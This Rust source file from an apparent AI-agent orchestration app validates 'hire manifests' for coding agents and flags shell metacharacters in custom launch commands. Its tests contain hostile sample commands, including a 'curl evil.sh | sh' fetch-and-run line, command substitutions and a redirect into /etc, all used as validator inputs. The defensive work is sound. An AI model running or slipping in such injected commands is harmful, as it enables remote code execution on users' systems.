//! Hire manifests: the JSON a person (or the Lead) writes to describe a 1:1 agent, and the
//! rules that make one safe to load. Pure functions, no I/O.
//!
//! Security model (after Munder Difflin's `hire@1`, docs/research/munder/features.md §3.14):
//! a manifest can NEVER start an agent. Importing or generating one only pre-fills the
//! add-agent wizard; the person reviews every field and the launch command, then confirms.
//! The core validates again at that moment, whatever the UI said.
//!
//! - hard size cap, unknown fields rejected, every string bounded and charset-checked;
//! - the engine is a known adapter or `custom`; only `custom` carries a command;
//! - a custom command may not contain shell metacharacters unless the person explicitly
//!   confirms (and never control characters): Codly runs it without a shell, so a
//!   metacharacter is either a mistake or an attempt at something the review should show.

use serde::{Deserialize, Serialize};
use ts_rs::TS;

use crate::adapters::classify;
use crate::model::{Provider, role_title};

/// The `schema` value of this manifest version.
pub const SCHEMA: &str = "codly/hire@1";
/// An exported agent: a hire manifest plus its traits, career and memory.
pub const AGENT_SCHEMA: &str = "codly/agent@1";
/// An exported agent's memory file rides on its prompts: keep it bounded.
pub const MAX_MEMORY: usize = 16 * 1024;
/// A manifest file or pasted text above this is refused before it is parsed.
pub const MAX_BYTES: usize = 64 * 1024;
pub const MAX_NAME: usize = 40;
pub const MAX_DESCRIPTION: usize = 600;
/// The goal rides on every prompt of the agent: keep it short enough to be cheap.
pub const MAX_GOAL: usize = 2000;
pub const MAX_COMMAND: usize = 1000;
pub const MAX_MODEL: usize = 100;
pub const MAX_SESSION: usize = 200;
/// The `provider` value for a command Codly does not have an adapter for.
pub const CUSTOM: &str = "custom";
/// Avatars the office can draw (the agent's `look_seed`).
pub const AVATARS: [&str; 8] = ["ember", "moss", "tide", "dusk", "sage", "flint", "pearl", "copper"];
/// Characters that make a shell do something other than run one program.
const SHELL_META: &str = ";&|<>$`(){}\\!#";

fn yes() -> bool {
    true
}

/// A 1:1 agent, as the add-agent wizard collects it and as a `.json` hire file stores it.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, TS)]
#[serde(deny_unknown_fields)]
#[ts(export)]
pub struct HireManifest {
    /// Must be `codly/hire@1`.
    pub schema: String,
    pub name: String,
    /// One of `AVATARS`.
    #[serde(default)]
    pub avatar: Option<String>,
    /// Identity hue, 0..8.
    #[serde(default)]
    pub color: Option<i64>,
    /// Job title (one of the usual badges).
    #[serde(default)]
    pub title: Option<String>,
    /// A CLI Codly has an adapter for (`claude`, `codex`, …) or `custom`.
    pub provider: String,
    #[serde(default)]
    pub model: Option<String>,
    /// `custom` only: the launch command (program and arguments, no shell).
    #[serde(default)]
    pub command: Option<String>,
    /// Work in an own git worktree (default) rather than in the project folder itself.
    #[serde(default = "yes")]
    pub isolate: bool,
    /// Continue an existing CLI session instead of starting a new one.
    #[serde(default)]
    pub resume_session: Option<String>,
    /// What this agent is for (its role), a few sentences.
    #[serde(default)]
    pub description: String,
    /// A standing goal, put in front of every prompt this agent gets.
    #[serde(default)]
    pub goal: String,
    /// Personality (`career::TRAITS` ids, at most 3). Some change how it works.
    #[serde(default)]
    pub traits: Vec<String>,
    /// `codly/agent@1` only: its track record, carried over.
    #[serde(default)]
    #[ts(optional)]
    pub career: Option<crate::model::Career>,
    /// `codly/agent@1` only: its memory file (lessons it wrote down).
    #[serde(default)]
    #[ts(optional)]
    pub memory: Option<String>,
}

/// What reviewing a manifest found. `manifest` is set when it parsed and passed the field rules.
#[derive(Debug, Clone, Default, Serialize, Deserialize, TS)]
#[ts(export)]
pub struct HireReview {
    pub manifest: Option<HireManifest>,
    /// Why it cannot be used (shown to the person).
    pub problems: Vec<String>,
    /// Shell metacharacters in the custom command: allowed only with an explicit confirm.
    pub shell_risks: Vec<String>,
}

/// The command a hire would run, as the wizard shows it.
#[derive(Debug, Clone, Serialize, Deserialize, TS)]
#[ts(export)]
pub struct LaunchPreview {
    /// Program and arguments, one line.
    pub command: String,
    /// Only a custom command can be edited; Codly adds more flags (session, tools, MCP) itself.
    pub editable: bool,
    pub shell_risks: Vec<String>,
    pub problems: Vec<String>,
}

/// The adapter a manifest's `provider` names.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Engine {
    Builtin(Provider),
    Custom,
}

pub fn engine_of(s: &str) -> Option<Engine> {
    if s == CUSTOM {
        return Some(Engine::Custom);
    }
    Provider::ALL.iter().copied().find(|p| p.as_str() == s).map(Engine::Builtin)
}

/// Parse a hire file: size cap first, then strict JSON (unknown fields are an error). The
/// field rules are applied separately by [`problems`].
pub fn parse(raw: &str) -> Result<HireManifest, String> {
    if raw.len() > MAX_BYTES {
        return Err(format!("the manifest is {} KB; the limit is {} KB", raw.len().div_ceil(1024), MAX_BYTES / 1024));
    }
    serde_json::from_str(raw.trim_start_matches('\u{feff}')).map_err(|e| format!("not a valid hire manifest: {e}"))
}

fn charset_ok(s: &str, extra: &str) -> bool {
    !s.starts_with('-') && s.chars().all(|c| c.is_ascii_alphanumeric() || extra.contains(c))
}

/// Every reason the manifest's fields are unusable (empty = fine). Does not judge shell metacharacters.
pub fn problems(m: &HireManifest) -> Vec<String> {
    let mut p = Vec::new();
    if m.schema != SCHEMA && m.schema != AGENT_SCHEMA {
        p.push(format!("schema must be \"{SCHEMA}\" or \"{AGENT_SCHEMA}\" (got \"{}\")", m.schema.chars().take(40).collect::<String>()));
    }
    if m.traits.len() > 3 || crate::career::clean_traits(&m.traits).len() != m.traits.len() {
        p.push(format!("traits: at most 3 of {}", crate::career::TRAITS.map(|t| t.0).join(", ")));
    }
    if m.schema == SCHEMA && (m.career.is_some() || m.memory.is_some()) {
        p.push(format!("career and memory come with an exported agent (\"{AGENT_SCHEMA}\")"));
    }
    if let Some(mem) = m.memory.as_deref()
        && (mem.len() > MAX_MEMORY || mem.chars().any(|c| c.is_control() && c != '\n' && c != '\t'))
    {
        p.push(format!("the memory must be plain text of at most {} KB", MAX_MEMORY / 1024));
    }
    let name = m.name.trim();
    if name.is_empty() {
        p.push("the agent needs a name".into());
    } else if name.chars().count() > MAX_NAME || name.chars().any(char::is_control) {
        p.push(format!("the name must be one line of at most {MAX_NAME} characters"));
    }
    if let Some(a) = m.avatar.as_deref().filter(|a| !AVATARS.contains(a)) {
        p.push(format!("unknown avatar \"{}\" (use one of {})", a.chars().take(20).collect::<String>(), AVATARS.join(", ")));
    }
    if m.color.is_some_and(|c| !(0..crate::orchestrator::names::COLORS).contains(&c)) {
        p.push(format!("color must be between 0 and {}", crate::orchestrator::names::COLORS - 1));
    }
    if let Some(t) = m.title.as_deref().filter(|t| role_title(t).is_none()) {
        p.push(format!("unknown title \"{}\"", t.chars().take(30).collect::<String>()));
    }
    let engine = engine_of(&m.provider);
    if engine.is_none() {
        let known: Vec<&str> = Provider::ALL.iter().map(|p| p.as_str()).chain([CUSTOM]).collect();
        p.push(format!("unknown provider \"{}\" (use one of {})", m.provider.chars().take(30).collect::<String>(), known.join(", ")));
    }
    if let Some(model) = m.model.as_deref() {
        if model.len() > MAX_MODEL || !charset_ok(model, "._:/@+-") {
            p.push("the model name has characters a model name never has".into());
        }
    }
    if let Some(s) = m.resume_session.as_deref() {
        if s.is_empty() || s.len() > MAX_SESSION || !charset_ok(s, "._:-") {
            p.push("the session id may only contain letters, digits and . _ : -".into());
        }
    }
    if m.description.chars().count() > MAX_DESCRIPTION {
        p.push(format!("the description is over {MAX_DESCRIPTION} characters"));
    }
    if m.goal.chars().count() > MAX_GOAL {
        p.push(format!("the goal is over {MAX_GOAL} characters"));
    }
    match (engine, m.command.as_deref().map(str::trim).filter(|c| !c.is_empty())) {
        (Some(Engine::Custom), None) => p.push("a custom agent needs a launch command".into()),
        (Some(Engine::Builtin(_)), Some(_)) => p.push("only a custom agent has a launch command; the others use their own adapter".into()),
        (Some(Engine::Custom), Some(c)) => {
            if c.len() > MAX_COMMAND {
                p.push(format!("the command is over {MAX_COMMAND} characters"));
            } else if let Err(e) = split_command(c) {
                p.push(e);
            }
        }
        _ => {}
    }
    p
}

/// Shell metacharacters found in a command, as readable names ("`;`", "`$`", "a line break").
pub fn shell_risks(command: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for c in command.chars() {
        let name = match c {
            '\n' | '\r' => "a line break".to_string(),
            c if SHELL_META.contains(c) => format!("`{c}`"),
            _ => continue,
        };
        if !out.contains(&name) {
            out.push(name);
        }
    }
    out
}

/// Split a command line into program and arguments: whitespace separates, single or double
/// quotes group, nothing else is special (no expansion, no escapes). Control characters and
/// unbalanced quotes are errors.
pub fn split_command(cmd: &str) -> Result<Vec<String>, String> {
    if cmd.chars().any(|c| c.is_control() && c != '\n' && c != '\r' && c != '\t') {
        return Err("the command contains control characters".into());
    }
    let (mut out, mut cur, mut quote, mut started) = (Vec::new(), String::new(), None::<char>, false);
    for c in cmd.chars() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => cur.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                started = true;
            }
            (None, c) if c.is_whitespace() => {
                if started {
                    out.push(std::mem::take(&mut cur));
                    started = false;
                }
            }
            (None, c) => {
                cur.push(c);
                started = true;
            }
        }
    }
    if quote.is_some() {
        return Err("the command has an unclosed quote".into());
    }
    if started {
        out.push(cur);
    }
    if out.is_empty() {
        return Err("the command is empty".into());
    }
    Ok(out)
}

/// Parse and judge a manifest in one go, for import and for the Lead's draft.
pub fn review(raw: &str) -> HireReview {
    let m = match parse(raw) {
        Ok(m) => m,
        Err(e) => return HireReview { problems: vec![e], ..Default::default() },
    };
    let problems = problems(&m);
    let shell_risks = m.command.as_deref().map(shell_risks).unwrap_or_default();
    HireReview { manifest: problems.is_empty().then_some(m), problems, shell_risks }
}

/// The last check before an agent exists: field rules, and shell metacharacters only with `confirm_shell`.
pub fn validate(m: &HireManifest, confirm_shell: bool) -> Result<(), Vec<String>> {
    let mut p = problems(m);
    let risks = m.command.as_deref().map(shell_risks).unwrap_or_default();
    if !risks.is_empty() && !confirm_shell {
        p.push(format!("the command contains {} (Codly runs it without a shell); confirm to allow it", risks.join(", ")));
    }
    if p.is_empty() { Ok(()) } else { Err(p) }
}

/// The command line for an engine and model, as the wizard shows it. For a built-in CLI this is
/// the fixed part of what Codly runs (it adds the session, tool and MCP flags per run).
pub fn launch_preview(provider: &str, model: Option<&str>, command: Option<&str>) -> LaunchPreview {
    let (model, _) = classify::split_model_effort(model);
    let with_model = |base: &str, flag: &str| match &model {
        Some(m) => format!("{base} {flag} {m}"),
        None => base.to_string(),
    };
    let builtin = |p: Provider| match p {
        Provider::Claude => with_model("claude -p --input-format stream-json --output-format stream-json --verbose", "--model"),
        Provider::Codex => "codex app-server".to_string(),
        Provider::Gemini => with_model("gemini --acp --skip-trust", "-m"),
        Provider::Opencode => "opencode acp".to_string(),
        Provider::Cursor => "cursor-agent acp".to_string(),
        Provider::Copilot => "copilot --acp".to_string(),
    };
    match engine_of(provider) {
        Some(Engine::Builtin(p)) => LaunchPreview { command: builtin(p), editable: false, shell_risks: vec![], problems: vec![] },
        Some(Engine::Custom) => {
            let c = command.unwrap_or("").trim();
            LaunchPreview {
                command: c.to_string(),
                editable: true,
                shell_risks: shell_risks(c),
                problems: if c.is_empty() { vec!["type the command to run".into()] } else { split_command(c).err().into_iter().collect() },
            }
        }
        None => LaunchPreview { command: String::new(), editable: false, shell_risks: vec![], problems: vec![format!("unknown provider \"{provider}\"")] },
    }
}

/// The request the wizard's "Generate with AI" sends to the Lead. The reply is read by the
/// wizard and goes through [`review`] like an imported file.
pub fn draft_prompt(brief: &str) -> String {
    let brief: String = brief.trim().chars().take(1000).collect();
    let providers: Vec<&str> = Provider::ALL.iter().map(|p| p.as_str()).collect();
    format!(
        "Draft a hire manifest for a new 1:1 coding agent. This is a one-off drafting request: do not submit a plan, \
         do not hire or delegate to anyone, do not use tools. Reply with ONLY one JSON object in a ```json block, using exactly these \
         fields and no others:\n\
         {{\"schema\": \"{SCHEMA}\", \"name\": \"<short first name>\", \"avatar\": one of {avatars:?}, \"color\": 0-7, \
         \"title\": <optional job title>, \"provider\": one of {providers:?}, \"model\": <optional>, \"isolate\": true, \
         \"description\": \"<role in 1-3 sentences, at most {MAX_DESCRIPTION} characters>\", \
         \"goal\": \"<the standing goal, at most {MAX_GOAL} characters>\"}}\n\
         Leave out `command` and `resume_session`. The user reviews the draft before anything starts.\n\
         What the agent is for: {brief}",
        avatars = AVATARS,
    )
}

/// A hired agent's briefing, put in front of each prompt it receives.
pub fn wrap_prompt(description: &str, goal: &str, isolate: bool, prompt: &str) -> String {
    let (description, goal) = (description.trim(), goal.trim());
    if description.is_empty() && goal.is_empty() && isolate {
        return prompt.to_string();
    }
    let mut out = String::from("[Standing briefing from the user; it applies to every message you get]\n");
    if !description.is_empty() {
        out.push_str(&format!("Your role: {description}\n"));
    }
    if !goal.is_empty() {
        out.push_str(&format!("Your standing goal: {goal}\n"));
    }
    if !isolate {
        out.push_str("You work directly in the user's project folder, not in a separate worktree. Codly does not commit for you.\n");
    }
    out.push('\n');
    out.push_str(prompt);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const OK: &str = r#"{"schema":"codly/hire@1","name":"Mina","provider":"claude","goal":"Keep the repo tidy","description":"Janitor"}"#;

    fn manifest() -> HireManifest {
        parse(OK).unwrap()
    }

    #[test]
    fn a_minimal_manifest_loads_with_defaults() {
        let m = manifest();
        assert!(m.isolate, "isolation is on unless the file says otherwise");
        assert_eq!((&m.avatar, m.color, &m.model, &m.command, &m.resume_session), (&None, None, &None, &None, &None));
        assert!(problems(&m).is_empty());
        assert!(review(OK).manifest.is_some());
    }

    #[test]
    fn unknown_fields_and_wrong_types_are_rejected() {
        let e = parse(&OK.replace('}', ",\"mcpServers\":[]}")).unwrap_err();
        assert!(e.contains("unknown field"), "{e}");
        assert!(parse(r#"{"schema":"codly/hire@1","name":3,"provider":"claude"}"#).is_err());
        assert!(parse("not json").is_err());
        let r = review(&OK.replace("Mina", "Mina\",\"tokenCap\":\"1"));
        assert!(r.manifest.is_none() && r.problems.len() == 1);
    }

    #[test]
    fn the_size_cap_applies_before_parsing() {
        let big = format!("{{\"schema\":\"codly/hire@1\",\"name\":\"A\",\"provider\":\"claude\",\"goal\":\"{}\"}}", "x".repeat(MAX_BYTES));
        let e = parse(&big).unwrap_err();
        assert!(e.contains("limit is 64 KB"), "{e}");
    }

    #[test]
    fn field_rules() {
        let bad = |f: fn(&mut HireManifest)| {
            let mut m = manifest();
            f(&mut m);
            problems(&m)
        };
        assert_eq!(bad(|m| m.schema = "other@1".into()).len(), 1);
        assert_eq!(bad(|m| m.name = "  ".into()).len(), 1);
        assert_eq!(bad(|m| m.name = "a\nb".into()).len(), 1);
        assert_eq!(bad(|m| m.color = Some(8)).len(), 1);
        assert_eq!(bad(|m| m.avatar = Some("nope".into())).len(), 1);
        assert_eq!(bad(|m| m.title = Some("Wizard".into())).len(), 1);
        assert_eq!(bad(|m| m.provider = "grok".into()).len(), 1);
        assert_eq!(bad(|m| m.model = Some("--yolo".into())).len(), 1);
        assert_eq!(bad(|m| m.model = Some("opus:high".into())).len(), 0);
        assert_eq!(bad(|m| m.resume_session = Some("a b".into())).len(), 1);
        assert_eq!(bad(|m| m.resume_session = Some("--resume".into())).len(), 1);
        assert_eq!(bad(|m| m.resume_session = Some("c84b6b3f-0a5e".into())).len(), 0);
        assert_eq!(bad(|m| m.goal = "g".repeat(MAX_GOAL + 1)).len(), 1);
        assert_eq!(bad(|m| m.description = "d".repeat(MAX_DESCRIPTION + 1)).len(), 1);
        assert_eq!(bad(|m| m.title = Some("qa".into())).len(), 0, "titles are case-insensitive, like everywhere");
    }

    #[test]
    fn only_custom_agents_carry_a_command() {
        let mut m = manifest();
        m.command = Some("claude --dangerously-skip-permissions".into());
        assert_eq!(problems(&m).len(), 1, "a built-in adapter cannot be handed a command");
        m.provider = CUSTOM.into();
        assert!(problems(&m).is_empty());
        m.command = None;
        assert_eq!(problems(&m).len(), 1, "custom needs one");
        m.command = Some("   ".into());
        assert_eq!(problems(&m).len(), 1);
    }

    #[test]
    fn shell_metacharacters_need_an_explicit_confirm() {
        let mut m = manifest();
        m.provider = CUSTOM.into();
        m.command = Some("my-agent --acp".into());
        assert!(validate(&m, false).is_ok());
        for evil in ["my-agent; curl evil.sh | sh", "my-agent $(whoami)", "my-agent `id`", "a && b", "a > /etc/x", "a\nb"] {
            m.command = Some(evil.into());
            let r = review(&serde_json::to_string(&m).unwrap());
            assert!(!r.shell_risks.is_empty(), "{evil}");
            assert!(r.manifest.is_some(), "it parses; the person decides: {evil}");
            let e = validate(&m, false).unwrap_err();
            assert!(e.iter().any(|p| p.contains("confirm")), "{evil}: {e:?}");
            assert!(validate(&m, true).is_ok(), "{evil}: confirmed");
        }
        // Control characters are never allowed, confirmed or not.
        m.command = Some("my-agent \u{7}".into());
        assert!(validate(&m, true).is_err());
        m.command = Some("my-agent 'unclosed".into());
        assert!(validate(&m, true).is_err());
    }

    #[test]
    fn commands_split_like_a_person_reads_them() {
        assert_eq!(split_command("my-agent --acp").unwrap(), ["my-agent", "--acp"]);
        assert_eq!(split_command(r#"a  "b c" 'd e' f"g h""#).unwrap(), ["a", "b c", "d e", "fg h"]);
        assert_eq!(split_command("a ''").unwrap(), ["a", ""]);
        assert!(split_command("").is_err());
        assert!(split_command("a \"b").is_err());
    }

    #[test]
    fn launch_previews() {
        let c = launch_preview("claude", Some("opus:high"), None);
        assert!(c.command.starts_with("claude -p ") && c.command.ends_with("--model opus"), "{}", c.command);
        assert!(!c.editable);
        assert_eq!(launch_preview("gemini", None, None).command, "gemini --acp --skip-trust");
        assert_eq!(launch_preview("opencode", Some("x"), None).command, "opencode acp");
        let custom = launch_preview("custom", None, Some("my-agent --acp; rm x"));
        assert!(custom.editable && custom.shell_risks == ["`;`"]);
        assert_eq!(launch_preview("custom", None, None).problems.len(), 1);
        assert_eq!(launch_preview("nope", None, None).problems.len(), 1);
    }

    #[test]
    fn the_briefing_is_added_to_a_prompt() {
        assert_eq!(wrap_prompt("", "", true, "[User] hi"), "[User] hi");
        let w = wrap_prompt("Docs writer", "Keep the README true", true, "[User] hi");
        assert!(w.contains("Your standing goal: Keep the README true") && w.contains("Your role: Docs writer") && w.ends_with("[User] hi"), "{w}");
        assert!(wrap_prompt("", "", false, "x").contains("not in a separate worktree"));
    }

    #[test]
    fn the_draft_request_names_the_schema_and_the_brief() {
        let p = draft_prompt("  triage bugs from the issue tracker ");
        assert!(p.contains(SCHEMA) && p.contains("triage bugs") && p.contains("\"claude\"") && p.contains("do not submit a plan"));
        // A draft that follows the request passes review.
        let reply = r#"{"schema":"codly/hire@1","name":"Tri","avatar":"moss","color":2,"title":"QA","provider":"codex","isolate":true,"description":"d","goal":"g"}"#;
        assert!(review(reply).manifest.is_some());
    }
}
